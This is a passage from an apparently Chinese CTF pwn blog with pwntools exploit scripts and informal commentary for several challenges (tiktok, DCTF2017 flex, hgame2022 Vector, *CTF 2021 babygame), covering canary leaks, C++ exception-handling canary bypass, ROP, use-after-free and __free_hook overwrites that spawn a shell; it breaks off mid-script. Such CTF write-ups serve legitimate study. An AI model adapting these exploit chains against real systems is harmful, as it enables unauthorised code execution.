class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./tiktok&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./tiktok&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;$ &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">password</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,password)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">sex,<span class="hljs-built_in">type</span>,age,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Add &#x27;</span><br>    payload += sex + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">type</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">str</span>(age).encode() + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">sex</span>):<br>    payload = <span class="hljs-string">b&#x27;Show&#x27;</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += sex<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Info &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Delete &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Convert &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Edit &#x27;</span><br>    payload += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">follow</span>(<span class="hljs-params">action,id1,id2</span>):<br>    payload = <span class="hljs-string">b&#x27;Follow &#x27;</span><br>    payload += action + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id1 + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id2 + <span class="hljs-string">b&#x27; &#x27;</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    paylaod = <span class="hljs-string">b&#x27;Clone &#x27;</span><br>    paylaod += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    paylaod += name<br>    sla(menu,paylaod)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>canary = u64(rc(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary))<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value1 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value1&quot;</span>,stack_value1)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1))<br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value2 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value2)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1) + p64(stack_value2))<br><br>elf_base = stack_value2 - <span class="hljs-number">0x39a0</span><br>pop_rdi = elf_base + <span class="hljs-number">0x000000000000ea73</span><br>main = elf_base + <span class="hljs-number">0x49f3</span><br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value3 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value3)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf_base + elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(main)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000096c3</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="DCTF2017-flex🤪"><a href="#DCTF2017-flex🤪" class="headerlink" title="DCTF2017 flex🤪"></a>DCTF2017 flex🤪</h2><p>作为一个没打过OI，更不会C++的蒻笱，异常处理这玩意直接涉及到笔者盲区了。</p><p>首先这题不能说是一个纯种的C++ pwn题，只能说是一个C和C++的<del>杂种</del>杂修~~</p><p>IDA打开，选项4很诱人，但仔细一看基本上利用不了，难受，就像打了脚没🐍出来一样难受😰</p><p>然后选项3是个FW，👴只能看function1&amp;2了</p><p><img src="/img/C++/6.png" alt="img"></p><p>很明显的负数溢出，然后可以栈溢出嘿嘿嘿，但是这玩意有个canary，bad，这比🐍不出来还要难受🥵</p><p>但是很明显这个func里存在奇怪的东西，throw，👴感觉这玩意有问题，但是👴8知道哪里有问题。</p><p><img src="/img/C++/7.png" alt="img"></p><p>摸不出来的👴只能去网上冲浪，卑微的窝在阴暗的下水道里读着大跌们的wp</p><p>然后👴明白啦</p><h3 id="异常处理机制"><a href="#异常处理机制" class="headerlink" title="异常处理机制"></a>异常处理机制</h3><p>try、throw、catch这三个卧龙凤雏总是一起出现</p><p>Throw抛出异常，try 包含异常模块，catch 捕捉抛出的异常</p><p>当程序throw一个异常的时候，基本流程是这样的喵</p><p>1、调用 __cxa_allocate_exception 函数，分配一个异常对象。</p><p><img src="/img/C++/8.png" alt="img"></p><p>2、调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</p><p><img src="/img/C++/9.png" alt="img"></p><p>3、__cxa_throw() 调用 _Unwind_RaiseException() 从而开始 unwind（unwind“回退”是伴随异常处理机制引入 C++ 中的一个新概念，主要用来确保在异常被抛出、捕获并处理后，所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收。）。</p><p><img src="/img/C++/10.png" alt="img"></p><p>4、_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</p><p>5、如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</p><p>6、_Unwind_RaiseException() 将控制权转到相应的catch代码。</p><p>然后👴就发现异常处理后👴就来到了一个奇怪的地方</p><p><img src="/img/C++/11.png" alt="img"></p><p>仔细一看，欸，原来function1里的try和catch模块反编译时并没有出来。</p><p>那这么一说，👴从孙子函数跳到了儿子函数并且没有经过canary的check，win！！</p><p>那么问题来了，该怎么食用这个漏洞捏。</p><p>6年前爹爹们的思路是：如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp， 而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave ret，这样一来我们就能成功绕过canary的检查而且进一步我们也能控制eip，，去执行了stack_pivot中的rop了。</p><p>妙，实在是妙啊。</p><p>PS：返回地址一定要填try和catch之间的地址（只有这样才能被捕获异常）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./flex&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./flex&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>pop_rdi = <span class="hljs-number">0x00000000004044d3</span><br>ret = <span class="hljs-number">0x0000000000400ba9</span><br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;no&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">2</span>).encode())<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x40134f\nc\n&quot;</span>)<br>paylaod = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span> + p64(<span class="hljs-number">0x6061c0</span>) + p64(<span class="hljs-number">0x401512</span>)<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,paylaod)<br><br>payload = flat([<br>    <span class="hljs-number">0x4044ca</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<span class="hljs-number">0x100</span>,<span class="hljs-number">0x606260</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x4044b0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>])<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>payload = p64(<span class="hljs-number">0xe3afe</span>+libc.address)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>爽啊，果然还是🐍出来才是最爽的啊😋</p><h2 id="hgame2022-Vector😎"><a href="#hgame2022-Vector😎" class="headerlink" title="hgame2022 Vector😎"></a>hgame2022 Vector😎</h2><p>跟vector容器有关的一道菜单堆</p><p>多了一个move function，那问题肯定在里面。</p><p><img src="/img/C++/12.png" alt="img"></p><p>当move输入的nex_idx过大时，resize会申请一个更大的chunk，并把原来chunk中的数据复制过去。可以看到，这个操作是在note[idx]</p><p>&#x3D; nullptr之前，因此note[idx] &#x3D; nullptr实际上是在给已经废弃的note中的idx置0。这样便能造成UAF。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./vector&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./vector&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">new_index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(new_index).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(<span class="hljs-number">7</span>-i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecc70</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>move(<span class="hljs-number">10</span>)<br>move(<span class="hljs-number">9</span>)<br><br>move(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">10</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">8</span>)<br>gdb.attach(p)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CTF-2021-babygame🤮"><a href="#CTF-2021-babygame🤮" class="headerlink" title="*CTF 2021 babygame🤮"></a>*CTF 2021 babygame🤮</h2><p>逆个🐕8，🧠要炸了</p><p>👴一开始觉得👴把9个关卡通关了👴就win了，8就是玩游戏🐎，👴在行，so easy</p><p>然后就没有然后了，👴对着IDA那坨屎山代码看了两个小时看不出来，👴摆了，润</p><p>后来👴想着fuzz试试，结果这个🐕8glibc是glibc-2.27 ubuntu1.2的版本，tcache里还莫得check，tcache 的double free根本8会报错，妈妈生的。</p><p>👴🏳️，钻进👴在下水道阴暗的小窝里看A3👴的wp，👴好奇A3👴是怎么调出来完成一个关卡后，选定一个关卡，然后退出会造成UAF的。</p><p>然后就很简单了，string可以申请任意大小的chunk，配合tcache double free 打free_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babygame&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span 